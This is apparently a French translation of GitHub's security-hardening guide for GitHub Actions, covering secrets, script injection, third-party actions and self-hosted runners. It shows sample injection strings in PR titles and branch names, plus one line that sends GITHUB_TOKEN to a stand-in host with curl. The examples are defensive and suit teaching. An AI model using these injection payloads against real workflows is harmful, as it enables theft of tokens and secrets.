---
title: Durcissement de la sécurité pour GitHub Actions
shortTitle: Security hardening
intro: 'Bonnes pratiques de sécurité pour l’utilisation des fonctionnalités {% data variables.product.prodname_actions %}.'
redirect_from:
  - /actions/getting-started-with-github-actions/security-hardening-for-github-actions
  - /actions/learn-github-actions/security-hardening-for-github-actions
versions:
  fpt: '*'
  ghes: '*'
  ghae: '*'
  ghec: '*'
type: overview
topics:
  - Security
miniTocMaxHeadingLevel: 3
ms.openlocfilehash: 0f93496361500083c23ef6f5095a785855246503
ms.sourcegitcommit: b617c4a7a1e4bf2de3987a86e0eb217d7031490f
ms.translationtype: HT
ms.contentlocale: fr-FR
ms.lasthandoff: 11/11/2022
ms.locfileid: '148161214'
---
{% data reusables.actions.enterprise-beta %} {% data reusables.actions.enterprise-github-hosted-runners %}

## Vue d’ensemble

Ce guide explique comment configurer le durcissement de la sécurité pour certaines fonctionnalités {% data variables.product.prodname_actions %}. Si les concepts {% data variables.product.prodname_actions %} ne sont pas familiers, consultez « [Concepts de base pour GitHub Actions](/actions/getting-started-with-github-actions/core-concepts-for-github-actions) ».

## Utilisation de secrets

Les valeurs sensibles ne doivent jamais être stockées sous forme de texte en clair dans les fichiers de workflow, mais plutôt comme secrets. Les [secrets](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets) peuvent être configurés au niveau de l’organisation, du dépôt ou de l’environnement et vous permettent de stocker des informations sensibles dans {% data variables.product.product_name %}.

Les secrets utilisent des [boîtes scellées libsodium](https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes) afin qu’ils soient chiffrés avant d’atteindre {% data variables.product.product_name %}. Cela se produit lorsque le secret est envoyé [à l’aide de l’interface utilisateur](/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository) ou par le biais de [l’API REST](/rest/reference/actions#secrets). Ce chiffrement côté client permet de réduire les risques liés à la journalisation accidentelle (par exemple, les journaux des exceptions et les journaux des demandes, entre autres) dans l’infrastructure de {% data variables.product.product_name %}. Une fois le secret chargé, {% data variables.product.product_name %} est ensuite en mesure de le déchiffrer afin qu’il puisse être injecté dans le runtime de workflow.

Pour empêcher toute divulgation accidentelle, {% data variables.product.product_name %} utilise un mécanisme qui tente de retirer les secrets qui apparaissent dans les journaux d’exécution. Ce retrait recherche des correspondances exactes de tous les secrets configurés, ainsi que des encodages courants des valeurs, comme Base64. Toutefois, étant donné qu’il existe plusieurs façons de transformer une valeur secrète, ce retrait n’est pas garanti. Par conséquent, vous devez suivre certaines étapes proactives et bonnes pratiques pour vous assurer que les secrets sont retirés et limiter les autres risques associés aux secrets :

- **Ne jamais utiliser de données structurées comme secret**
    - Les données structurées peuvent entraîner l’échec du retrait des secrets dans les journaux, car le retrait s’appuie en grande partie sur la recherche d’une correspondance exacte pour la valeur secrète spécifique. Par exemple, n’utilisez pas d’objet blob JSON, XML ou YAML (ou similaire) pour encapsuler une valeur secrète, car cela réduit considérablement la probabilité que les secrets soient correctement retirés. Au lieu de cela, créez des secrets individuels pour chaque valeur sensible.
- **Inscrire tous les secrets utilisés dans les workflows**
    - Si un secret est utilisé pour générer une autre valeur sensible dans un workflow, cette valeur générée doit être [inscrite officiellement en tant que secret](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) afin qu’elle soit retirée si elle apparaît dans les journaux. Par exemple, si vous utilisez une clé privée pour générer un jeton JWT signé pour accéder à une API web, veillez à inscrire ce jeton JWT en tant que secret, sinon il ne sera pas retiré s’il entre dans la sortie du journal.
    - L’inscription des secrets s’applique également à toute sorte de transformation/d’encodage. Si votre secret est transformé d’une quelconque manière (par exemple, encodé en Base64 ou en URL), veillez également à inscrire la nouvelle valeur en tant que secret.
- **Auditer la façon dont les secrets sont gérés**
    - Auditez la manière dont les secrets sont utilisés pour vous assurer qu’ils sont gérés comme prévu. Pour ce faire, examinez le code source du dépôt exécutant le workflow et vérifiez toutes les actions utilisées dans le workflow. Par exemple, vérifiez qu’ils ne sont pas envoyés à des hôtes involontaires ni imprimés explicitement dans la sortie du journal.
    - Affichez les journaux d’exécution de votre workflow après avoir testé des entrées valides/non valides, et vérifiez que les secrets sont correctement retirés, ou masqués. Il n’est pas toujours évident de savoir comment une commande ou un outil que vous appelez envoie des erreurs à `STDOUT` et `STDERR`, et les secrets peuvent se retrouver par la suite dans les journaux des erreurs. Par conséquent, il est recommandé d’examiner manuellement les journaux de workflow après avoir testé des entrées valides et non valides.
- **Utiliser des informations d’identification limitées au minimum**
    - Assurez-vous que les informations d’identification utilisées dans les workflows disposent des privilèges minimum requis, et n’oubliez pas que tout utilisateur ayant un accès en écriture à votre dépôt dispose d’un accès en lecture à tous les secrets configurés dans ce dépôt. 
    - Les actions peuvent utiliser `GITHUB_TOKEN` en y accédant à partir du contexte `github.token`. Pour plus d’informations, consultez « [Contextes](/actions/learn-github-actions/contexts#github-context) ». Vous devez donc vous assurer que `GITHUB_TOKEN` dispose des autorisations minimales requises. En matière de sécurité, il est recommandé de définir l’autorisation par défaut pour `GITHUB_TOKEN` sur l’accès en lecture uniquement pour le contenu du dépôt. Les autorisations peuvent ensuite être augmentées, selon les besoins, pour des travaux individuels dans le fichier de workflow. Pour plus d’informations, consultez « [Authentification dans un workflow](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token) ». 
- **Auditer et faire pivoter les secrets inscrits**
    - Passez régulièrement en revue les secrets inscrits pour confirmer qu’ils sont toujours requis. Supprimez ceux qui ne sont plus nécessaires.
    - Faites pivoter régulièrement les secrets pour réduire la fenêtre de temps pendant laquelle un secret compromis est valide.
- **Envisager d’exiger une révision pour l’accès aux secrets**
    - Vous pouvez utiliser des réviseurs nécessaires pour protéger les secrets d’environnement. Un travail de workflow ne peut pas accéder aux secrets d’environnement tant que l’approbation n’est pas accordée par un réviseur. Pour plus d’informations sur le stockage de secrets dans des environnements ou sur la nécessité de révisions pour les environnements, consultez « [Secrets chiffrés](/actions/reference/encrypted-secrets) » et « [Utilisation d’environnements pour le déploiement](/actions/deployment/using-environments-for-deployment) ».

{% warning %}

**Avertissement** : Tout utilisateur ayant un accès en écriture à votre dépôt dispose d’un accès en lecture à tous les secrets configurés dans ce dépôt. Par conséquent, vous devez vous assurer que les informations d’identification utilisées dans les workflows disposent des privilèges minimum requis.

{% endwarning %}

## Utilisation de `CODEOWNERS` pour superviser les modifications

Vous pouvez utiliser la fonctionnalité `CODEOWNERS` pour contrôler la façon dont les modifications sont apportées à vos fichiers de workflow. Par exemple, si tous vos fichiers de workflow sont stockés dans `.github/workflows`, vous pouvez ajouter ce répertoire à la liste des propriétaires de code afin que toutes les modifications proposées pour ces fichiers nécessitent d’abord l’approbation d’un réviseur désigné.

Pour plus d’informations, consultez « [À propos des propriétaires de code](/github/creating-cloning-and-archiving-repositories/about-code-owners) ».

## Compréhension du risque d’injections de scripts

Lors de la création de workflows, d’[actions personnalisées](/actions/creating-actions/about-actions) et d’[actions composites](/actions/creating-actions/creating-a-composite-action), vous devez toujours déterminer si votre code peut exécuter des entrées non approuvées provenant d’attaquants. Cela peut se produire lorsqu’un attaquant ajoute des commandes et des scripts malveillants à un contexte. Lorsque votre workflow s’exécute, ces chaînes peuvent être interprétées comme du code qui est ensuite exécuté sur l’exécuteur.

 Les attaquants peuvent ajouter leur propre contenu malveillant au [contexte `github`](/actions/reference/context-and-expression-syntax-for-github-actions#github-context), qui doit être traité comme une entrée potentiellement non approuvée. Ces contextes se terminent généralement par `body`, `default_branch`, `email`, `head_ref`, `label`, `message`, `name`, `page_name`,`ref` et `title`.  Par exemple : `github.event.issue.title` ou `github.event.pull_request.body`.

 Vous devez vous assurer que ces valeurs ne sont pas directement transmises aux workflows, actions, appels d’API, ni ailleurs où elles peuvent être interprétées comme du code exécutable. En adoptant la même posture de programmation défensive que pour tout autre code d’application privilégié, vous pouvez durcir la sécurité de votre utilisation de {% data variables.product.prodname_actions %}. Pour plus d’informations sur certaines des étapes qu’un attaquant peut suivre, consultez [« Impact potentiel d’un exécuteur compromis »](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner).

En outre, il existe d’autres sources moins évidentes d’entrées potentiellement non approuvées, telles que les noms de branche et les adresses e-mail, qui peuvent être assez flexibles en termes de contenu autorisé. Par exemple, `zzz";echo${IFS}"hello";#` pourrait être un nom de branche valide et un vecteur d’attaque possible pour un dépôt cible.

Les sections suivantes expliquent comment vous pouvez atténuer le risque d’injection de script.

### Exemple d’attaque par injection de script

Une attaque par injection de script peut se produire directement dans le script Inline d’un workflow. Dans l’exemple suivant, une action utilise une expression pour tester la validité d’un titre de demande de tirage, mais ajoute également le risque d’injection de script :

{% raw %}
```
      - name: Check PR title
        run: |
          title="${{ github.event.pull_request.title }}"
          if [[ $title =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

Cet exemple est vulnérable à l’injection de script, car la commande `run` s’exécute dans un script shell temporaire sur l’exécuteur. Avant l’exécution du script shell, les expressions à l’intérieur de {% raw %}`${{ }}`{% endraw %} sont évaluées, puis remplacées par les valeurs résultantes, ce qui peut la rendre vulnérable à l’injection de commande d’environnement.

Pour injecter des commandes dans ce workflow, l’attaquant peut créer une demande de tirage avec le titre `a"; ls $GITHUB_WORKSPACE"` :

![Exemple d’injection de script dans le titre de la demande de tirage](/assets/images/help/images/example-script-injection-pr-title.png)

Dans cet exemple, le caractère `"` est utilisé pour interrompre l’instruction {% raw %}`title="${{ github.event.pull_request.title }}"`{% endraw %}, ce qui permet à la commande `ls` d’être exécutée sur l’exécuteur. Vous pouvez voir la sortie de la commande `ls` dans le journal :

![Exemple de résultat de l’injection de script](/assets/images/help/images/example-script-injection-result.png)

## Bonnes pratiques pour atténuer les attaques par injection de script

Il existe un certain nombre d’approches différentes pour vous aider à atténuer le risque d’injection de script :

### Utilisation d’une action au lieu d’un script Inline (recommandé)

L’approche recommandée consiste à créer une action qui traite la valeur de contexte en tant qu’argument. Cette approche n’est pas vulnérable à l’attaque par injection, car la valeur de contexte n’est pas utilisée pour générer un script shell, mais est plutôt passée à l’action en tant qu’argument :

{% raw %}
```
uses: fakeaction/checktitle@v3
with:
    title: ${{ github.event.pull_request.title }}
```
{% endraw %}

### Utilisation d’une variable d’environnement intermédiaire

Pour les scripts Inline, l’approche privilégiée pour gérer les entrées non approuvées consiste à définir la valeur de l’expression sur une variable d’environnement intermédiaire.

L’exemple suivant utilise Bash pour traiter la valeur `github.event.pull_request.title` en tant que variable d’environnement :

{% raw %}
```
      - name: Check PR title
        env:
          TITLE: ${{ github.event.pull_request.title }}
        run: |
          if [[ "$TITLE" =~ ^octocat ]]; then
          echo "PR title starts with 'octocat'"
          exit 0
          else
          echo "PR title did not start with 'octocat'"
          exit 1
          fi
```
{% endraw %}

Dans cet exemple, la tentative d’injection de script échoue :

![Exemple d’injection de script atténuée](/assets/images/help/images/example-script-injection-mitigated.png)

Avec cette approche, la valeur de l’expression {% raw %}`${{ github.event.issue.title }}`{% endraw %} est stockée en mémoire et utilisée comme variable, et n’interagit pas avec le processus de génération de script. En outre, envisagez d’utiliser des variables d’environnement entre guillemets doubles pour éviter le [fractionnement de mots](https://github.com/koalaman/shellcheck/wiki/SC2086), mais il s’agit de [l’une des nombreuses](https://mywiki.wooledge.org/BashPitfalls) recommandations générales pour l’écriture de scripts shell et elle n’est pas spécifique à {% data variables.product.prodname_actions %}.

{% ifversion fpt or ghec %}
### Utilisation de workflows de démarrage pour l’analyse du code

{% data reusables.advanced-security.starter-workflows-beta %} {% data variables.product.prodname_code_scanning_capc %} vous permet de trouver des failles de sécurité avant qu’elles n’atteignent la production. {% data variables.product.product_name %} fournit des workflows de démarrage pour l’{% data variables.product.prodname_code_scanning %}. Vous pouvez utiliser ces workflows suggérés pour construire vos workflows d’{% data variables.product.prodname_code_scanning %} au lieu de commencer à partir de zéro. Le workflow de {% data variables.product.company_short%}, le {% data variables.code-scanning.codeql_workflow %}, est alimenté par {% data variables.product.prodname_codeql %}. Il existe également des workflows de démarrage tiers disponibles.

Pour plus d’informations, consultez « [À propos de l’{% data variables.product.prodname_code_scanning %}](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/about-code-scanning) » et « [Configuration de l’{% data variables.product.prodname_code_scanning %} en utilisant des workflows de démarrage](/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/setting-up-code-scanning-for-a-repository#setting-up-code-scanning-using-starter-workflows) ».

{% endif %}

### Restriction des autorisations pour les jetons

Pour atténuer le risque d’un jeton exposé, envisagez de restreindre les autorisations affectées. Pour plus d’informations, consultez « [Modification des autorisations pour GITHUB_TOKEN](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token) ».

{% ifversion fpt or ghec or ghes > 3.4 %}

## Utilisation d’OpenID Connect pour accéder aux ressources cloud

{% data reusables.actions.about-oidc-short-overview %}

{% endif %}

## Utilisation d’actions tierces

Les travaux individuels d’un workflow peuvent interagir avec d’autres travaux (et les compromettre). Par exemple, un travail qui interroge les variables d’environnement utilisées par un travail ultérieur, qui écrit des fichiers dans un répertoire partagé qu’un travail ultérieur traite ou encore plus directement qui interagit avec le socket Docker et inspecte d’autres conteneurs en cours d’exécution et exécute des commandes dans ces derniers.

Cela signifie qu’une compromission d’une seule action au sein d’un workflow peut être très importante, car cette action compromise aurait accès à tous les secrets configurés sur votre dépôt et peut être en mesure d’utiliser `GITHUB_TOKEN` pour écrire dans le dépôt. Par conséquent, il existe un risque important dans le provisionnement d’actions provenant de dépôts tiers sur {% data variables.product.prodname_dotcom %}. Pour plus d’informations sur certaines des étapes qu’un attaquant peut suivre, consultez [« Impact potentiel d’un exécuteur compromis »](/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner).

Vous pouvez atténuer ce risque en suivant ces bonnes pratiques :

* **Épingler des actions à un SHA de commit de longueur complète**

  L’épinglage d’une action à un SHA de commit de longueur complète est actuellement le seul moyen d’utiliser une action en tant que version immuable. L’épinglage à un SHA particulier permet d’atténuer le risque d’un intervenant malveillant qui ajoute une porte dérobée au dépôt de l’action, car il devrait générer une collision SHA-1 pour une charge utile d’objet Git valide.

* **Auditer le code source de l’action**

  Vérifiez que l’action gère le contenu de votre dépôt et vos secrets comme prévu. Par exemple, vérifiez que les secrets ne sont pas envoyés à des hôtes involontaires ni journalisés par inadvertance.

* **Épingler des actions à une balise uniquement si vous approuvez le créateur**

  Bien que l’épinglage à un SHA de commit soit l’option la plus sécurisée, la spécification d’une balise est plus pratique et est largement utilisée. Si vous souhaitez spécifier une balise, veillez à faire confiance aux créateurs de l’action. Le badge « Créateur vérifié » sur {% data variables.product.prodname_marketplace %} est un signal utile, car il indique que l’action a été écrite par une équipe dont l’identité a été vérifiée par {% data variables.product.prodname_dotcom %}. Notez qu’il existe un risque lié à cette approche, même si vous approuvez l’auteur, car une balise peut être déplacée ou supprimée si un intervenant malveillant obtient l’accès au dépôt stockant l’action.

{% ifversion fpt or ghes > 3.3 or ghae > 3.3 or ghec %}
## Réutilisation de workflows tiers

Les mêmes principes décrits ci-dessus pour l’utilisation d’actions tierces s’appliquent également à l’utilisation de workflows tiers. Vous pouvez atténuer les risques associés à la réutilisation des workflows en suivant les mêmes bonnes pratiques décrites ci-dessus. Pour plus d’informations, consultez « [Réutilisation de workflows](/actions/learn-github-actions/reusing-workflows) ».
{% endif %}

{% ifversion internal-actions %}
## Autorisation de l’accès des workflows aux dépôts internes

{% data reusables.actions.outside-collaborators-internal-actions %} Pour plus d’informations, consultez « [Partage d’actions et de workflows au sein de votre entreprise](/actions/creating-actions/sharing-actions-and-workflows-with-your-enterprise) ».
{% endif %}

{% ifversion allow-actions-to-approve-pr %}
## Empêcher {% data variables.product.prodname_actions %} {% ifversion allow-actions-to-approve-pr-with-ent-repo %}de créer ou {% endif %}d’approuver des demandes de tirage

{% data reusables.actions.workflow-pr-approval-permissions-intro %} Autoriser les workflows, ou toute autre automatisation, à {% ifversion allow-actions-to-approve-pr-with-ent-repo %}créer ou {% endif %}approuver les demandes de tirage peut poser un risque de sécurité si la demande de tirage est fusionnée sans la supervision appropriée.

Pour plus d’informations sur la configuration de ce paramètre, consultez {% ifversion allow-actions-to-approve-pr-with-ent-repo %}{% ifversion ghes or ghec or ghae %}« [Application de stratégies pour {% data variables.product.prodname_actions %} dans votre entreprise](/enterprise-cloud@latest/admin/policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise#preventing-github-actions-from-creating-or-approving-pull-requests) »,{% endif %}{% endif %} « [Désactivation ou limitation de {% data variables.product.prodname_actions %} pour votre organisation](/github/setting-up-and-managing-organizations-and-teams/disabling-or-limiting-github-actions-for-your-organization#preventing-github-actions-from-{% ifversion allow-actions-to-approve-pr-with-ent-repo %}creating-or-{% endif %}approving-pull-requests) »{% ifversion allow-actions-to-approve-pr-with-ent-repo %} et « [Gestion des paramètres de {% data variables.product.prodname_actions %} pour un dépôt](/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests) »{% endif %}.
{% endif %}

## Utilisation d’OpenSSF Scorecards pour sécuriser les workflows

[Scorecards](https://github.com/ossf/scorecard) est un outil de sécurité automatisé qui signale les pratiques de chaîne d’approvisionnement risquées. Vous pouvez utiliser l’[action Scorecards](https://github.com/marketplace/actions/ossf-scorecard-action) et le [workflow de démarrage](https://github.com/actions/starter-workflows) pour suivre les bonnes pratiques de sécurité. Une fois configurée, l’action Scorecards s’exécute automatiquement lors des modifications de dépôt et alerte les développeurs sur les pratiques de chaîne d’approvisionnement risquées à l’aide de l’expérience d’analyse de code intégrée. Le projet Scorecards exécute un certain nombre de vérifications, notamment les attaques par injection de script, les autorisations de jeton et les actions épinglées.

## Impact potentiel d’un exécuteur compromis

Ces sections envisagent certaines des étapes qu’un attaquant peut suivre s’il est en mesure d’exécuter des commandes malveillantes sur un exécuteur {% data variables.product.prodname_actions %}.

{% note %}

**Remarque :** Les exécuteurs hébergés par {% data variables.product.prodname_dotcom %} n’analysent pas le code malveillant téléchargé par un utilisateur pendant leur travail, par exemple une bibliothèque tierce compromise.

{% endnote %}

### Accès aux secrets

Les workflows déclenchés à l’aide de l’événement `pull_request` disposent d’autorisations en lecture seule et n’ont pas accès aux secrets. Toutefois, ces autorisations diffèrent pour divers déclencheurs d’événements comme `issue_comment`, `issues` et `push`, où l’attaquant pourrait tenter de voler des secrets de dépôt ou d’utiliser l’autorisation d’écriture du [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token) du travail.

- Si le secret ou le jeton est défini sur une variable d’environnement, il est directement accessible via l’environnement à l’aide de `printenv`.
- Si le secret est utilisé directement dans une expression, le script shell généré est stocké sur disque et est accessible.
- Pour une action personnalisée, le risque peut varier selon la façon dont un programme utilise le secret qu’il a obtenu à partir de l’argument :

  {% raw %}
  ```
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```
  {% endraw %}

Bien que {% data variables.product.prodname_actions %} nettoie les secrets de la mémoire qui ne sont pas référencés dans le workflow (ou une action incluse), `GITHUB_TOKEN` et les secrets référencés peuvent être collectés par un attaquant déterminé.

### Exfiltration des données d’un exécuteur

Un attaquant peut exfiltrer les secrets volés ou d’autres données de l’exécuteur. Pour empêcher la divulgation accidentelle de secrets, {% data variables.product.prodname_actions %} [retire automatiquement les secrets imprimés dans le journal](/actions/reference/encrypted-secrets#accessing-your-secrets), mais ce n’est pas une véritable limite de sécurité, car les secrets peuvent être envoyés intentionnellement au journal. Par exemple, les secrets obfusqués peuvent être exfiltrés avec `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. En outre, étant donné que l’attaquant peut exécuter des commandes arbitraires, il peut utiliser des requêtes HTTP pour envoyer des secrets ou d’autres données de dépôt à un serveur externe.

### Vol du `GITHUB_TOKEN` du travail

Il est possible qu’un attaquant vole le `GITHUB_TOKEN` d’un travail. L’exécuteur {% data variables.product.prodname_actions %} reçoit automatiquement un `GITHUB_TOKEN` généré avec des autorisations limitées au dépôt qui contient le workflow, et le jeton expire une fois le travail terminé. Une fois expiré, le jeton n’est plus utile à un attaquant. Pour contourner cette limitation, il peut automatiser l’attaque et l’effectuer en fractions de seconde en appelant un serveur contrôlé par l’attaquant avec le jeton, par exemple : `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.

### Modification du contenu d’un référentiel

Le serveur attaquant peut utiliser l’API {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} pour [modifier le contenu du dépôt](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), y compris les versions, si les autorisations affectées de `GITHUB_TOKEN` [ne sont pas limitées](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).

## Prise en compte de l’accès entre dépôts

{% data variables.product.prodname_actions %} est intentionnellement limité à un seul dépôt à la fois. `GITHUB_TOKEN` octroie le même niveau d’accès qu’un utilisateur disposant d’un accès en écriture, car tout utilisateur ayant un accès en écriture peut accéder à ce jeton en créant ou en modifiant un fichier de workflow, et en élevant les autorisations de `GITHUB_TOKEN` si nécessaire. Les utilisateurs disposent d’autorisations spécifiques pour chaque dépôt. Si vous permettez au `GITHUB_TOKEN` pour un dépôt d’accorder l’accès à un autre, cela impacte le modèle d’autorisation {% data variables.product.prodname_dotcom %} s’il n’est pas implémenté avec soin. De même, vous devez agir avec précaution lors de l’ajout de jetons d’authentification {% data variables.product.prodname_dotcom %} à un workflow, car cela peut également affecter le modèle d’autorisation {% data variables.product.prodname_dotcom %} en accordant par inadvertance un accès étendu aux collaborateurs.

Nous avons [un plan sur la feuille de route {% data variables.product.prodname_dotcom %}](https://github.com/github/roadmap/issues/74) pour prendre en charge un flux qui permet l’accès entre dépôts dans {% data variables.product.product_name %}, mais cette fonctionnalité n’est pas encore prise en charge. Actuellement, la seule façon d’effectuer des interactions entre dépôts privilégiés consiste à placer un jeton d’authentification {% data variables.product.prodname_dotcom %} ou une clé SSH en tant que secret dans le workflow. Étant donné que de nombreux types de jetons d’authentification ne tiennent pas compte de l’accès précis à des ressources spécifiques, il existe un risque important d’utiliser le type de jeton incorrect, car il peut accorder un accès beaucoup plus large que prévu.

Cette liste décrit les approches recommandées pour accéder aux données de dépôt dans un workflow, dans l’ordre décroissant de préférence :

1. **`GITHUB_TOKEN`**
    -  L’étendue de ce jeton est intentionnellement limitée au dépôt qui a appelé le workflow. Le jeton peut avoir le même niveau d’accès qu’un utilisateur disposant d’un accès en écriture sur le dépôt. Le jeton est créé avant que chaque travail commence et expire lorsque le travail est terminé. Pour plus d’informations, consultez « [Authentification avec GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token) ».
    - `GITHUB_TOKEN` doit être utilisé chaque fois que possible.
2. **Clé de déploiement de dépôt**
    - Les clés de déploiement sont l’un des seuls types d’informations d’identification qui accordent un accès en lecture ou en écriture à un seul dépôt, et peuvent être utilisées pour interagir avec un autre dépôt dans un workflow. Pour plus d’informations, consultez « [Gestion des clés de déploiement](/developers/overview/managing-deploy-keys#deploy-keys) ».
    - Notez que les clés de déploiement peuvent uniquement cloner et envoyer des données vers le dépôt à l’aide de Git et ne peuvent pas être utilisées pour interagir avec l’API REST ou GraphQL, de sorte qu’elles ne sont peut-être pas appropriées à vos besoins.
3. **Jetons {% data variables.product.prodname_github_app %}**
    - {% data variables.product.prodname_github_apps %} peut être installé sur des dépôts sélectionnés, et même disposer d’autorisations précises sur les ressources qu’ils contiennent. Vous pouvez créer une {% data variables.product.prodname_github_app %} interne à votre organisation, l’installer sur les dépôts auxquels vous avez besoin d’accéder au sein de votre workflow et vous authentifier en tant qu’installation au sein de votre workflow pour accéder à ces dépôts.
4. **{% data variables.product.pat_generic %}s**
    - Vous ne devez jamais utiliser de {% data variables.product.pat_v1 %}. Ces jetons accordent l’accès à tous les dépôts au sein des organisations auxquelles vous avez accès ainsi qu’à tous les dépôts personnels de votre compte personnel. Cela accorde indirectement un accès étendu à tous les utilisateurs avec un accès en écriture du dépôt dans lequel se trouve le workflow.
    - Si vous utilisez un {% data variables.product.pat_generic %}, vous ne devez jamais utiliser un {% data variables.product.pat_generic %} de votre propre compte. Si vous quittez une organisation, les workflows utilisant ce jeton s’interrompent immédiatement et le débogage de ce problème peut être difficile. Au lieu de cela, vous devez utiliser un {% ifversion pat-v2%}{% data variables.product.pat_v2 %}s{% else %}{% data variables.product.pat_generic %}s{% endif %} d’un nouveau compte qui appartient à votre organisation et qui n’a accès qu’à des dépôts spécifiques qui sont nécessaires au workflow. Notez que cette approche n’est pas scalable et doit être évitée en faveur d’alternatives, telles que les clés de déploiement.
5. **Clés SSH sur un compte personnel**
    - Les workflows ne doivent jamais utiliser les clés SSH sur un compte personnel. Comme pour les {% data variables.product.pat_v1_plural %}, elles accordent des autorisations en lecture/écriture à tous vos dépôts personnels ainsi qu’à tous les dépôts auxquels vous avez accès via l’appartenance à l’organisation.  Cela accorde indirectement un accès étendu à tous les utilisateurs avec un accès en écriture du dépôt dans lequel se trouve le workflow. Si vous envisagez d’utiliser une clé SSH parce que vous devez uniquement effectuer des clones ou des envois de dépôts, et non interagir avec des API publiques, vous devez utiliser des clés de déploiement individuelles à la place.

## Durcissement pour les exécuteurs auto-hébergés

{% ifversion fpt or ghec %} Les exécuteurs **hébergés par {% data variables.product.prodname_dotcom %}** exécutent du code dans des machines virtuelles isolées éphémères et propres, ce qui signifie qu’il n’existe aucun moyen de compromettre cet environnement de manière permanente ni d’accéder à plus d’informations que celles placées dans cet environnement pendant le processus de démarrage.
{% endif %}

{% ifversion fpt or ghec %}Les exécuteurs **auto-hébergés**{% elsif ghes or ghae %}auto-hébergés{% endif %} pour {% data variables.product.product_name %} n’ont pas de garanties concernant l’exécution dans des machines virtuelles propres éphémères et peuvent être compromis de manière permanente par du code non approuvé dans un workflow.

{% ifversion fpt or ghec %}Par conséquent, les exécuteurs auto-hébergés ne doivent presque [jamais être utilisés pour les dépôts publics](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security) sur {% data variables.product.product_name %}, car tout utilisateur peut ouvrir des demandes de tirage sur le dépôt et compromettre l’environnement. De même, soyez{% elsif ghes or ghae %}Soyez{% endif %} prudent quand vous utilisez des exécuteurs autohébergés sur des dépôts privés ou internes, car les personnes qui peuvent dupliquer (fork) le dépôt et ouvrir une demande de tirage (généralement celles qui ont un accès en lecture au dépôt) peuvent compromettre l’environnement des exécuteurs autohébergés, notamment en accédant aux secrets et à `GITHUB_TOKEN` qui, en fonction de ses paramètres, permet d’octroyer l’accès en écriture au dépôt. Bien que les workflows puissent contrôler l’accès aux secrets d’environnement à l’aide d’environnements et de révisions nécessaires, ces workflows ne sont pas exécutés dans un environnement isolé et encourent toujours les mêmes risques lors de l’exécution sur un exécuteur auto-hébergé.

Lorsqu’un exécuteur auto-hébergé est défini au niveau de l’organisation ou de l’entreprise, {% data variables.product.product_name %} peut planifier des workflows à partir de plusieurs dépôts sur le même exécuteur. Par conséquent, une compromission de la sécurité de ces environnements peut avoir un impact important. Pour réduire l’étendue d’une compromission, vous pouvez créer des limites en organisant vos exécuteurs auto-hébergés en groupes distincts. Vous pouvez restreindre les {% ifversion restrict-groups-to-workflows %}workflows, {% endif %}organisations et dépôts ayant accès aux groupes d’exécuteurs. Pour plus d’informations, consultez « [Gestion de l’accès aux exécuteurs auto-hébergés à l’aide de groupes](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups) ».

Vous devez également prendre en compte l’environnement des machines d’exécuteurs auto-hébergés :
- Quelles informations sensibles résident sur la machine configurée en tant qu’exécuteur auto-hébergé ? Par exemple, les clés SSH privées, les jetons d’accès aux API, entre autres.
- La machine dispose-t-elle d’un accès réseau aux services sensibles ? Par exemple, les services de métadonnées Azure ou AWS. La quantité d’informations sensibles dans cet environnement doit être réduite au minimum, et vous devez toujours être conscient que tout utilisateur capable d’appeler des workflows a accès à cet environnement.

Certains clients peuvent tenter d’atténuer partiellement ces risques en implémentant des systèmes qui détruisent automatiquement l’exécuteur auto-hébergé après l’exécution de chaque travail. Toutefois, cette approche peut ne pas être aussi efficace que prévu, car il n’existe aucun moyen de garantir qu’un exécuteur auto-hébergé exécute un seul travail. Certains travaux utilisent des secrets comme arguments de ligne de commande qui peuvent être vus par un autre travail s’exécutant sur le même exécuteur, tel que `ps x -w`. Cela peut entraîner des fuites de secrets.

### Planification de votre stratégie de gestion pour les exécuteurs auto-hébergés

Un exécuteur auto-hébergé peut être ajouté à différents niveaux de votre hiérarchie {% data variables.product.prodname_dotcom %} : niveau de l’entreprise, de l’organisation ou du dépôt. Ce placement détermine qui sera en mesure de gérer l’exécuteur :

**Gestion centralisée :**
  - Si vous envisagez d’avoir une équipe centralisée propriétaire des exécuteurs auto-hébergés, il est recommandé d’ajouter vos exécuteurs au niveau le plus élevé de l’entreprise ou de l’organisation mutuelle. Cela fournit à votre équipe un emplacement unique pour afficher et gérer vos exécuteurs.
  - Si vous n’avez qu’une seule organisation, l’ajout de vos exécuteurs au niveau de l’organisation est effectivement la même approche, mais vous risquez de rencontrer des difficultés si vous ajoutez une autre organisation à l’avenir.

**Gestion décentralisée :**
  - Si chaque équipe gère ses propres exécuteurs auto-hébergés, la recommandation consiste à ajouter les exécuteurs au niveau le plus élevé de la propriété de l’équipe. Par exemple, si chaque équipe possède sa propre organisation, ce sera plus simple si les exécuteurs sont également ajoutés au niveau de l’organisation.
